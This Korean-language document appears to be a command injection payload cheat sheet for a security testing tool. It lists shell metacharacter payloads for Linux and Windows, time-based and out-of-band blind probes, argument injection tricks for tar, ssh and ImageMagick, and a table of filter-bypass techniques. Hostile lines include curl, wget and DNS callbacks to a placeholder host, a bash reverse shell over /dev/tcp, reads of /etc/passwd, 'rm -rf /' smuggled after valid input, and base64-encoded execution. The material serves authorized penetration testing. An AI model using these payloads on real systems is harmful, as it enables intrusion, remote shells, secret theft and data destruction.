### 기본 페이로드

**Linux/macOS 메타문자 (셸 경유 sink):**
- `; id` (query/body)
- `| id`
- `|| id` (앞 명령 실패 시 실행)
- `&& id` (앞 명령 성공 시 실행)
- `& id` (백그라운드)
- `\n id` (`%0a`, newline)
- `$(id)` (subshell)
- `` `id` `` (backtick)
- `<$(id)>` (process substitution, bash 4+)

**Windows 메타문자:**
- `& whoami` (query/body)
- `&& whoami`
- `| whoami`
- `|| whoami`
- `%0a whoami`

**무해 확인 명령:**

| OS | 명령 |
|---|---|
| Linux | `id`, `whoami`, `uname -a`, `cat /etc/hostname`, `pwd`, `printenv` |
| Windows | `whoami`, `dir`, `hostname`, `type C:\Windows\win.ini`, `ver` |

**Time-based Blind:**
- `; sleep 5` (Linux)
- `; ping -c 5 127.0.0.1` (Linux)
- `& timeout 5` (Windows)
- `& ping -n 5 127.0.0.1` (Windows)
- `; perl -e "sleep(5)"` (Perl)
- `; python -c "import time;time.sleep(5)"` (Python)

**OOB Blind (외부 콜백):**
- `; curl https://CALLBACK.oast.fun/cmdi` (Linux)
- `; wget https://CALLBACK/cmdi`
- `; dig CALLBACK.oast.fun` (DNS)
- `; nslookup CALLBACK.oast.fun`
- `& nslookup CALLBACK.oast.fun` (Windows)
- `; bash -i >& /dev/tcp/CALLBACK/4444 0>&1` (reverse shell — sandbox 한정)

**Argument Injection (셸 미경유 sink, `ARG_INJECTION` 라벨):**
- `--checkpoint=1 --checkpoint-action=exec=sh -c id` (tar)
- `--use-compress-program=id` (tar)
- `-vv -ofile=/tmp/x.so` (curl/ssh)
- `-o ProxyCommand=id` (ssh)
- `--config=/dev/stdin` + stdin 페이로드 (curl)
- ImageMagick: `:|id` 같은 형태 입력 파일명 (CVE-2016-3714)
- `--no-preserve-root` (rm — 의도치 않은 삭제 게이트)

**측정 (기준선 필수):**
```
# 기준선 3회
for i in 1 2 3; do curl -w "%{time_total}\n" -o /dev/null -s "https://target/api/ping?host=127.0.0.1"; done
# 페이로드 3회
for i in 1 2 3; do curl -w "%{time_total}\n" -o /dev/null -s "https://target/api/ping?host=127.0.0.1%3Bsleep+5"; done
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| 메타문자 블랙리스트 (`;`, `|`) | `` `id` ``, `$(id)`, `\n` (`%0a`), `&` (백그라운드), `\|\|` |
| `escapeshellarg` 단독 (PHP) | 인자 주입 (`-`/`--` 시작) — `--no-preserve-root`, `--config=/dev/stdin` |
| 공백 차단 | `${IFS}` (`cat${IFS}/etc/passwd`), `<` redirection (`cat</etc/passwd`), `{cat,/etc/passwd}` brace expansion, `%09` (TAB), `%0a` (LF) |
| 화이트리스트가 옵션 시작 문자 미차단 | `--checkpoint-action=exec=sh -c id` (tar), `--use-compress-program=id` |
| 키워드 블랙리스트 (`cat`, `id`) | 와일드카드 `/u?r/b?n/i?` (`/usr/bin/id`), HEX `$'\x69\x64'`, 빈 변수 `c${x}at`, base64 `echo aWQ= \| base64 -d \| sh` |
| ASCII 메타문자만 검증 | Unicode `；` (fullwidth semicolon, 일부 환경), IFS 변형 |
| 첫 인자만 검증 후 concat | `validInput; rm -rf /` — 검증 통과 후 concat 시점에 메타문자 |
| stdin 격리 (input via stdin only) | 일부 프로그램(`bash`/`python`)은 stdin 코드 실행 — `echo "id" \| bash` |
| 정규식 차단 (`/[;&|]/`) | `\r`, NUL byte `\x00`, Unicode 변형, RTL `\u202E` |
| Windows + Linux 하이브리드 차단 | OS별 메타문자 다름 — Linux 차단했지만 Windows `^`, `%var%` 누락 |
| sandbox/seccomp 격리 | 영향도 감소만 — 컨테이너 내부 실행 자체는 가능, 라벨링 필요 |

**Process Substitution (bash 4+):**
- `<(id)`, `>(id)` — 일부 명령에서 파일 인자처럼 사용
- `cmd <(echo $x)` 형태에 사용자 입력 시 추가 명령 실행

**HEX/Octal/Base64 인코딩:**
- `$'\x69\x64'` (HEX `id`)
- `\151\144` (Octal)
- `$(echo aWQ= \| base64 -d)` (base64 decoded `id`)

---

### 참고사항

- 빈출 sink: DNS lookup/ping, git clone, 이미지 변환 (ImageMagick/ffmpeg/wkhtmltopdf), PDF 생성, 파일 변환 파이프라인
- 파일 업로드 후 변환 파이프라인이 인자 주입 노출 빈번 (file-upload-scanner와 결합)
- Time-based는 sleep보다 OOB가 신뢰성 높음 (네트워크 지터 무관)
- Windows에선 `;` 미작동 — `&` 또는 `&&` 사용
- 셸 미경유 sink (`execFile`/`spawn(cmd, [args])`/`subprocess.run([...])`)도 인자 주입(`-`/`--`)으로 위험 (ARG_INJECTION 라벨)
- ImageMagick은 SVG/MVG 입력 자체가 RCE 게이트 (ImageTragick, CVE-2016-3714)
- `child_process.fork(modulePath)` (Node)는 modulePath가 사용자 입력이면 임의 JS 실행
- 컨테이너/seccomp는 영향도 감소만 — 격리 ≠ 차단 (라벨링 권장)
- DNS callback (dig/nslookup)이 가장 신뢰성 높은 OOB — outbound HTTP 차단된 환경에서도 동작
- `xp_cmdshell` (MSSQL), `pg_read_server_files` (PostgreSQL)는 SQLi 결합 시 OS 명령 실행 게이트
- PowerShell 환경에서는 `Invoke-Expression` (IEX)이 직접 코드 평가
- Argument injection은 검증 코드가 옵션 시작 문자(`-`/`--`)를 차단하지 않으면 셸 미경유여도 위험
- HTTP 응답에 명령 결과가 직접 반환되지 않아도 OOB로 확인 가능 (Blind RCE)
